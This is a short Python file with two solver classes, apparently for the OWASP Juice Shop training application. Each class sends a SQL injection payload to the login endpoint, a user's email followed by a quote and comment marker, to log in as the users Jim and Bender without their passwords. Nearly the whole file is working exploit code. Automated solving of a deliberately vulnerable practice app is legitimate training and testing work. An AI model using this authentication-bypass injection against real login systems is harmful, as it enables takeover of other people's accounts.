from core.base_solver import BaseSolver
from loguru import logger

class LoginJimSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "loginJimChallenge"

    def solve(self) -> bool:
        # Jim's email is jim@juice-sh.op
        payload = {
            "email": "jim@juice-sh.op' --",
            "password": "x"
        }
        res = self.client.post("/rest/user/login", json=payload)
        
        if res.status_code == 200:
            logger.info("Logged in as Jim.")
            return True
        return False

class LoginBenderSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "loginBenderChallenge"

    def solve(self) -> bool:
        # Bender's email is bender@juice-sh.op
        payload = {
            "email": "bender@juice-sh.op' --",
            "password": "x"
        }
        res = self.client.post("/rest/user/login", json=payload)
        
        if res.status_code == 200:
            logger.info("Logged in as Bender.")
            return True
        return False
